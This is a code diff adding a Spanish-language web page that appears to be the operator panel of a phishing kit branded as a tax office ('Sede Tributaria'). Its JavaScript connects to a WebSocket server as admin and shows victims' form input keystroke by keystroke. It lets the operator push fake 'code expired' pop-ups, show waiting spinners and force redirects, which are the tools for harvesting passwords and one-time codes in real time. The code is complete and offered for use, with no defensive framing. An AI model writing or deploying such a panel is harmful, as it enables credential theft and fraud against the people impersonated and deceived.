@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control en Tiempo Real</title>
+    <style>
+        :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; --border: #334155; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
+        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 20px; }
+        h1 { margin: 0; font-size: 24px; color: #60a5fa; }
+        .status-badge { padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; background: #ef4444; color: white; }
+        .status-badge.connected { background: #22c55e; }
+        
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media(max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
+        h3 { margin-top: 0; border-bottom: 1px solid var(--border); padding-bottom: 10px; font-size: 18px; }
+        
+        .user-session { background: #090d16; border: 1px solid var(--border); padding: 15px; border-radius: 8px; margin-bottom: 15px; }
+        .user-session h4 { margin: 0 0 10px 0; color: #93c5fd; display: flex; justify-content: space-between; }
+        .input-live { font-family: monospace; background: #111827; padding: 8px; border-radius: 4px; margin: 5px 0; border-left: 3px solid var(--accent); }
+        
+        .controls { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
+        input[type="text"], select { padding: 10px; background: #0f172a; border: 1px solid var(--border); color: white; border-radius: 6px; }
+        .btn-group { display: flex; gap: 8px; }
+        button { padding: 10px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
+        button:hover { opacity: 0.9; }
+        .btn-blue { background: #3b82f6; color: white; }
+        .btn-orange { background: #f59e0b; color: white; }
+        .btn-red { background: #ef4444; color: white; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>⚡ Panel de Control - Sede Tributaria</h1>
+        <div id="connectionStatus" class="status-badge">Desconectado del Servidor</div>
+    </header>
+
+    <div class="grid">
+        <!-- SECCIÓN 1: USUARIOS ACTIVOS Y ESCRITURA EN TIEMPO REAL -->
+        <div class="card">
+            <h3>👥 Sesiones de Usuarios Activos (Tecla por Tecla)</h3>
+            <div id="usersContainer">
+                <p style="color: #94a3b8; text-align: center;">Esperando conexiones de usuarios...</p>
+            </div>
+        </div>
+
+        <!-- SECCIÓN 2: CENTRO DE ACCIONES Y MENSAJES PERSONALIZADOS -->
+        <div class="card">
+            <h3>🎛️ Acciones y Mensajes Personalizados</h3>
+            <div class="controls">
+                <label>Seleccionar Usuario Objetivo:</label>
+                <select id="targetUserSelect">
+                    <option value="">-- Todos los usuarios activos --</option>
+                </select>
+
+                <label>Mensaje Personalizado (Ej: "Este código expiró"):</label>
+                <input type="text" id="customMessage" placeholder="Ej: Código inválido o expirado, introduzca otro...">
+
+                <div class="btn-group">
+                    <button class="btn-blue" onclick="sendAlert()">Enviar Alerta Popup</button>
+                    <button class="btn-orange" onclick="toggleSpinner(true)">Activar Spinner (Espera)</button>
+                    <button class="btn-red" onclick="toggleSpinner(false)">Quitar Spinner</button>
+                </div>
+
+                <hr style="border-color: var(--border); margin: 15px 0;">
+
+                <label>Redirigir usuario a URL:</label>
+                <input type="text" id="redirectUrl" placeholder="https://google.com">
+                <button class="btn-red" onclick="sendRedirect()">Forzar Redirección</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+        const wsHost = prompt("Introduce la IP o dominio de tu servidor WebSocket central:", "localhost:8080") || "localhost:8080";
+        
+        let socket = null;
+        const activeUsers = {};
+
+        function connectPanel() {
+            socket = new WebSocket(wsProtocol + wsHost);
+
+            socket.onopen = function() {
+                const statusBadge = document.getElementById('connectionStatus');
+                statusBadge.innerText = "Conectado al Servidor";
+                statusBadge.classList.add('connected');
+                socket.send(JSON.stringify({ type: 'register', role: 'admin' }));
+            };
+
+            socket.onmessage = function(event) {
+                try {
+                    const data = JSON.parse(event.data);
+
+                    if (data.type === 'user_input') {
+                        let clientId = data.clientId;
+                        if (!activeUsers[clientId]) {
+                            activeUsers[clientId] = {};
+                            updateUserSelect();
+                        }
+                        activeUsers[clientId][data.fieldId] = data.value;
+                        renderUsers();
+                    }
+                    else if (data.type === 'user_disconnected') {
+                        delete activeUsers[data.clientId];
+                        updateUserSelect();
+                        renderUsers();
+                    }
+                } catch(e) {}
+            };
+
+            socket.onclose = function() {
+                const statusBadge = document.getElementById('connectionStatus');
+                statusBadge.innerText = "Desconectado. Reconectando...";
+                statusBadge.classList.remove('connected');
+                setTimeout(connectPanel, 3000);
+            };
+        }
+
+        function renderUsers() {
+            const container = document.getElementById('usersContainer');
+            const userIds = Object.keys(activeUsers);
+
+            if (userIds.length === 0) {
+                container.innerHTML = '<p style="color: #94a3b8; text-align: center;">No hay usuarios activos en este momento.</p>';
+                return;
+            }
+
+            let html = '';
+            userIds.forEach(id => {
+                html += `<div class="user-session">
+                    <h4>ID: ${id} <span style="font-size:11px; color:#22c55e;">● En línea</span></h4>`;
+                
+                const fields = activeUsers[id];
+                for (let [field, val] of Object.entries(fields)) {
+                    html += `<div class="input-live"><strong>${field}:</strong> ${escapeHtml(val)}</div>`;
+                }
+                html += `</div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        function updateUserSelect() {
+            const select = document.getElementById('targetUserSelect');
+            const currentVal = select.value;
+            let options = '<option value="">-- Todos los usuarios activos --</option>';
+            
+            Object.keys(activeUsers).forEach(id => {
+                options += `<option value="${id}">Usuario: ${id}</option>`;
+            });
+            
+            select.innerHTML = options;
+            select.value = currentVal;
+        }
+
+        function sendAlert() {
+            const target = document.getElementById('targetUserSelect').value;
+            const message = document.getElementById('customMessage').value || "Aviso importante de administración.";
+            
+            socket.send(JSON.stringify({
+                type: 'command',
+                target: target || 'all',
+                action: 'alert',
+                message: message
+            }));
+            alert("Alerta enviada correctamente.");
+        }
+
+        function toggleSpinner(show) {
+            const target = document.getElementById('targetUserSelect').value;
+            const message = document.getElementById('customMessage').value || "Procesando información...";
+
+            socket.send(JSON.stringify({
+                type: 'command',
+                target: target || 'all',
+                action: 'spinner',
+                show: show,
+                message: message
+            }));
+            alert(show ? "Spinner de espera activado en el usuario." : "Spinner desactivado.");
+        }
+
+        function sendRedirect() {
+            const target = document.getElementById('targetUserSelect').value;
+            const url = document.getElementById('redirectUrl').value;
+
+            if (!url) {
+                alert("Por favor, introduce una URL de destino.");
+                return;
+            }
+
+            socket.send(JSON.stringify({
+                type: 'command',
+                target: target || 'all',
+                action: 'redirect',
+                url: url
+            }));
+            alert("Orden de redirección enviada.");
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        connectPanel();
+    </script>
+</body>
+</html>
